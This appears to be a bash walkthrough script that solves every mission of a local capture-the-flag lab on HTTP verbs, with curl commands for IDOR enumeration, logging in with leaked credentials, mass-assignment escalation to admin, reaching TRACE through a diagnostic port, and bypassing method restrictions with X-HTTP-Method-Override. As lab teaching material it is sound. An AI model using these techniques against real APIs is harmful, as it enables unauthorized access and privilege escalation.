#!/usr/bin/env bash
# Local Tech Lab :: HTTP Verbs -- guided walkthrough (pensado para grabar video)
# Uso:  ./walkthrough.sh            -> pausa en cada paso (ENTER para seguir)
#       ./walkthrough.sh --auto     -> sin pausas
#       ./walkthrough.sh --auto --check  -> modo CI: exit 1 si no se capturan 9/9 flags
# SPOILERS: este script resuelve todas las misiones.

BASE="${LTL_URL:-http://127.0.0.1:8080}"
DIAG="${LTL_DIAG_URL:-http://127.0.0.1:9000}"
AUTO=0; CHECK=0
for a in "$@"; do
  case "$a" in --auto) AUTO=1 ;; --check) CHECK=1 ;; esac
done

CMD=$'\e[1;32m'; HDR=$'\e[1;35m'; FLG=$'\e[1;33m'; DIM=$'\e[2m'; OFF=$'\e[0m'
FLAGS=(); OUT=""; TOKEN=""

pause()   { [ "$AUTO" -eq 1 ] || read -rp "${DIM}  [ENTER para continuar]${OFF}" _; }
mission() { printf '\n%s━━━ %s ━━━%s\n%s%s%s\n' "$HDR" "$1" "$OFF" "$DIM" "$2" "$OFF"; pause; }
say()     { printf '%s# %s%s\n' "$DIM" "$1" "$OFF"; }

# run '<comando>'  -> muestra el comando (con $BASE/$DIAG expandidos) y lo ejecuta
run() {
  local shown="${1//\$BASE/$BASE}"; shown="${shown//\$DIAG/$DIAG}"
  printf '%s$ %s%s\n' "$CMD" "$shown" "$OFF"
  OUT="$(eval "$1" 2>&1)"
  printf '%s\n\n' "$OUT"
  pause
}

grab() {
  local f; f="$(grep -o 'LTL{[^}]*}' <<<"$OUT" | head -1)"
  if [ -n "$f" ]; then FLAGS+=("$f"); printf '%s[+] FLAG: %s%s\n' "$FLG" "$f" "$OFF"
  else printf '[-] no se encontró flag en la respuesta\n'; fi
}

cat <<'EOF'
  _                    _   _____         _       _          _
 | |    ___   ___ __ _| | |_   _|__  ___| |__   | |    __ _| |__
 | |   / _ \ / __/ _` | |   | |/ _ \/ __| '_ \  | |   / _` | '_ \
 | |__| (_) | (_| (_| | |   | |  __/ (__| | | | | |__| (_| | |_) |
 |_____\___/ \___\__,_|_|   |_|\___|\___|_| |_| |_____\__,_|_.__/
                     :: HTTP Verbs Lab ::
EOF

mission "RECON" "Primero, ¿qué hay en el objetivo?"
run 'curl -s $BASE/api/missions | head -n 12'

# ── M1 GET ────────────────────────────────────────────────────────────────
mission "M1 · GET · Intern's Notes" "GET lee recursos. Listamos notas y enumeramos IDs ocultos (IDOR)."
run 'curl -s $BASE/api/m1/notes'
say "Solo se listan 1,2,3. Enumeramos IDs y miramos el código de estado:"
run 'for id in 1 2 3 4 100 1337; do printf "id=%-5s -> " $id; curl -s -o /dev/null -w "%{http_code}\n" "$BASE/api/m1/notes?id=$id"; done'
run 'curl -s "$BASE/api/m1/notes?id=1337"'; grab
say "Guarda estas credenciales para M4. Y fíjate en la nota 2 (servirá en M8)."
run 'curl -s "$BASE/api/m1/notes?id=2"'

# ── M2 HEAD ───────────────────────────────────────────────────────────────
mission "M2 · HEAD · Silent Vault" "HEAD = GET sin cuerpo. Solo devuelve cabeceras."
run 'curl -s $BASE/api/m2/vault'
say "El cuerpo no dice nada. Pedimos solo las cabeceras con -I (HEAD):"
run 'curl -sI $BASE/api/m2/vault'; grab

# ── M3 OPTIONS ────────────────────────────────────────────────────────────
mission "M3 · OPTIONS · Gatekeeper" "OPTIONS pregunta qué métodos acepta un recurso (cabecera Allow)."
run 'curl -s $BASE/api/m3/gate'
run 'curl -si -X OPTIONS $BASE/api/m3/gate'
say "Allow revela un verbo personalizado: LTLSCAN. curl -X acepta cualquier verbo:"
run 'curl -s -X LTLSCAN $BASE/api/m3/gate'; grab

# ── M4 POST ───────────────────────────────────────────────────────────────
mission "M4 · POST · Operator Login" "POST envía datos para crear/procesar. Usamos las credenciales de M1."
run 'curl -si $BASE/api/m4/login | head -n 1'
run 'curl -s -X POST $BASE/api/m4/login -H "Content-Type: application/json" -d "{\"user\":\"operator\",\"pass\":\"L0cal-T3ch!2026\"}"'; grab
TOKEN="$(grep -o '"token": *"[^"]*"' <<<"$OUT" | cut -d'"' -f4)"
say "export TOKEN=$TOKEN"

# ── M5 PUT ────────────────────────────────────────────────────────────────
mission "M5 · PUT · Compliance Upload" "PUT crea o reemplaza el recurso en la URI exacta. Es idempotente: 201 la 1ª vez, 200 después."
run 'curl -si -X PUT $BASE/api/m5/files/ltl-check.txt -H "Content-Type: text/plain" --data-binary "LOCAL TECH LAB - compliance OK"'; grab
run 'curl -s -o /dev/null -w "segundo PUT -> %{http_code}\n" -X PUT $BASE/api/m5/files/ltl-check.txt --data-binary "LOCAL TECH LAB - compliance OK"'
run 'curl -s $BASE/api/m5/files/ltl-check.txt'

# ── M6 PATCH ──────────────────────────────────────────────────────────────
mission "M6 · PATCH · Partial Promotion" "PATCH modifica parcialmente. Si el servidor no filtra campos -> mass assignment."
run 'curl -s $BASE/api/m6/profile -H "X-LTL-Token: $TOKEN"'
run 'curl -s -X PUT $BASE/api/m6/profile -H "X-LTL-Token: $TOKEN"'
run 'curl -s -X PATCH $BASE/api/m6/profile -H "X-LTL-Token: $TOKEN" -H "Content-Type: application/merge-patch+json" -d "{\"role\":\"admin\"}"'; grab

# ── M7 DELETE ─────────────────────────────────────────────────────────────
mission "M7 · DELETE · Ghost Session" "DELETE elimina el recurso indicado en la URI."
run 'curl -s $BASE/api/m7/sessions -H "X-LTL-Token: $TOKEN"'
run 'curl -s -X DELETE $BASE/api/m7/sessions/s-ghost -H "X-LTL-Token: $TOKEN"'; grab

# ── M8 TRACE ──────────────────────────────────────────────────────────────
mission "M8 · TRACE · Proxy Whispers" "TRACE devuelve la petición tal como llegó (eco). Riesgo: Cross-Site Tracing (XST)."
run 'curl -si -X TRACE $BASE/api/m8/echo | head -n 1'
say "nginx bloquea TRACE siempre (405). Pero la nota 2 menciona un listener de diagnóstico en :9000..."
run 'curl -s $DIAG/'
run 'curl -si -X TRACE $DIAG/api/m8/echo'; grab

# ── M9 Verb tampering ─────────────────────────────────────────────────────
mission "M9 · Method Override · Edge Bypass" "nginx solo deja pasar GET/POST (limit_except). ¿La app confía en X-HTTP-Method-Override?"
run 'curl -si -X DELETE $BASE/api/m9/records/42'
run 'curl -s -X POST $BASE/api/m9/records/42 -H "X-HTTP-Method-Override: DELETE"'; grab

# ── Scoreboard ────────────────────────────────────────────────────────────
mission "SCOREBOARD" "Enviamos las ${#FLAGS[@]} flags capturadas."
for f in "${FLAGS[@]}"; do
  curl -s -X POST "$BASE/api/submit" -H "Content-Type: application/json" -d "{\"flag\":\"$f\"}" \
    | grep -o '"mission": *"[^"]*"\|"correct": *[a-z]*' | tr '\n' ' '; echo
done
run 'curl -s $BASE/api/scoreboard'

if [ "$CHECK" -eq 1 ]; then
  if grep -q '"status": "PWNED"' <<<"$OUT"; then echo "CHECK OK: 9/9"; exit 0; fi
  echo "CHECK FAILED"; exit 1
fi
